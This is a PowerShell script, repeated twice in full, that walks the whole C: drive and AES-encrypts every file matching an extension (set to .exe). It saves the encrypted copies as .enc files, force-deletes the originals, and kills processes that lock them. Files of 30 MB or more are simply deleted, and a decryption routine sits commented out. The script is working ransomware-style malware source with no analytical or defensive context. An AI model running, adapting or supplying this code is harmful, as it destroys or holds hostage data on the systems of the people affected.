    function Get-Files($ext){
        $files = Get-ChildItem -Path 'C:\' -Filter $ext -Recurse -ErrorAction SilentlyContinue -Force | % { $_.FullName }
        return $files
    }

    function Create-AesManagedObject($key, $IV) {
        $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
        if ($IV) {
            if ($IV.getType().Name -eq "String") {
                $aesManaged.IV = [System.Convert]::FromBase64String($IV)
            }
            else {
                $aesManaged.IV = $IV
            }
        }
        if ($key) {
            if ($key.getType().Name -eq "String") {
                $aesManaged.Key = [System.Convert]::FromBase64String($key)
            }
            else {
                $aesManaged.Key = $key
            }
        }
        $aesManaged
    }

    function Create-AesKey() {
        $aesManaged = Create-AesManagedObject
        $aesManaged.GenerateKey()
        [System.Convert]::ToBase64String($aesManaged.Key)
    }

    function Encrypt-String($key, $unencryptedString) {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
        $aesManaged = Create-AesManagedObject $key
        $encryptor = $aesManaged.CreateEncryptor()
        $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
        [byte[]] $fullData = $aesManaged.IV + $encryptedData
        $aesManaged.Dispose()
        [System.Convert]::ToBase64String($fullData)
    }

    function Decrypt-String($key, $encryptedStringWithIV) {
        $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
        $IV = $bytes[0..15]
        $aesManaged = Create-AesManagedObject $key $IV
        $decryptor = $aesManaged.CreateDecryptor();
        $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
        $aesManaged.Dispose()
        [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
    }

    function Encrypt-All($exts, $key){
        $files = @()
        Foreach ($ext in $exts){
            $file = Get-Files $ext
            $files += $file
        }
        $erroractionPreference="stop"
        Foreach ($file in $files){
            $file
            If (((Get-Item $file).length/1MB) -lt 30){
                $content = Get-Content -literalPath $file 
                $encryptedcontent = Encrypt-String $key $content 
                Set-Content -Path $file'.enc' -Value $encryptedcontent
                try{
                    Remove-Item –path $file -force
                }
                catch{
                try{
                    Get-Process | foreach{$processVar = $_;$_.Modules | foreach{if($_.FileName -eq $file){cmd /c taskkill /f /pid $processVar.id}}}
                    Remove-Item –path $file -force
                    }
                    catch{}
                }
            }
            Else{
                try{
                        Remove-Item –path $file -force
                    }
                    catch{
                        try{
                            Get-Process | foreach{$processVar = $_;$_.Modules | foreach{if($_.FileName -eq $file){cmd /c taskkill /f /pid $processVar.id}}}
                            Remove-Item –path $file -force
                        }
                        catch{}
                    }
            }
        }
    }

    function Decrypt-All($key){
        $ext = '*.enc'
        $files = Get-Files $ext
        $files
        Foreach ($file in $files){
            $file
             $content = Get-Content $file
             $decryptedcontent = Decrypt-String $key $content
             $file = $file -replace ".{4}$"
             Set-Content -Path $file -Value $decryptedcontent
             Remove-Item –path $file'.enc'
        }
    }

$key = Create-AesKey
Set-Content -Path 'C:\Users\ydgaygui\Desktop\key.aes' -Value $key
$ext = '*.exe'
Encrypt-All $ext $key
#$key = Get-Content -Path 'C:\Users\ydgaygui\Desktop\key.aes'
#Decrypt-All $key

    function Get-Files($ext){
        $files = Get-ChildItem -Path 'C:\' -Filter $ext -Recurse -ErrorAction SilentlyContinue -Force | % { $_.FullName }
        return $files
    }

    function Create-AesManagedObject($key, $IV) {
        $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
        if ($IV) {
            if ($IV.getType().Name -eq "String") {
                $aesManaged.IV = [System.Convert]::FromBase64String($IV)
            }
            else {
                $aesManaged.IV = $IV
            }
        }
        if ($key) {
            if ($key.getType().Name -eq "String") {
                $aesManaged.Key = [System.Convert]::FromBase64String($key)
            }
            else {
                $aesManaged.Key = $key
            }
        }
        $aesManaged
    }

    function Create-AesKey() {
        $aesManaged = Create-AesManagedObject
        $aesManaged.GenerateKey()
        [System.Convert]::ToBase64String($aesManaged.Key)
    }

    function Encrypt-String($key, $unencryptedString) {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
        $aesManaged = Create-AesManagedObject $key
        $encryptor = $aesManaged.CreateEncryptor()
        $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
        [byte[]] $fullData = $aesManaged.IV + $encryptedData
        $aesManaged.Dispose()
        [System.Convert]::ToBase64String($fullData)
    }

    function Decrypt-String($key, $encryptedStringWithIV) {
        $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
        $IV = $bytes[0..15]
        $aesManaged = Create-AesManagedObject $key $IV
        $decryptor = $aesManaged.CreateDecryptor();
        $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
        $aesManaged.Dispose()
        [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
    }

    function Encrypt-All($exts, $key){
        $files = @()
        Foreach ($ext in $exts){
            $file = Get-Files $ext
            $files += $file
        }
        $erroractionPreference="stop"
        Foreach ($file in $files){
            $file
            If (((Get-Item $file).length/1MB) -lt 30){
                $content = Get-Content -literalPath $file 
                $encryptedcontent = Encrypt-String $key $content 
                Set-Content -Path $file'.enc' -Value $encryptedcontent
                try{
                    Remove-Item –path $file -force
                }
                catch{
                try{
                    Get-Process | foreach{$processVar = $_;$_.Modules | foreach{if($_.FileName -eq $file){cmd /c taskkill /f /pid $processVar.id}}}
                    Remove-Item –path $file -force
                    }
                    catch{}
                }
            }
            Else{
                try{
                        Remove-Item –path $file -force
                    }
                    catch{
                        try{
                            Get-Process | foreach{$processVar = $_;$_.Modules | foreach{if($_.FileName -eq $file){cmd /c taskkill /f /pid $processVar.id}}}
                            Remove-Item –path $file -force
                        }
                        catch{}
                    }
            }
        }
    }

    function Decrypt-All($key){
        $ext = '*.enc'
        $files = Get-Files $ext
        $files
        Foreach ($file in $files){
            $file
             $content = Get-Content $file
             $decryptedcontent = Decrypt-String $key $content
             $file = $file -replace ".{4}$"
             Set-Content -Path $file -Value $decryptedcontent
             Remove-Item –path $file'.enc'
        }
    }

$key = Create-AesKey
Set-Content -Path 'C:\Users\ydgaygui\Desktop\key.aes' -Value $key
$ext = '*.exe'
Encrypt-All $ext $key
#$key = Get-Content -Path 'C:\Users\ydgaygui\Desktop\key.aes'
#Decrypt-All $key

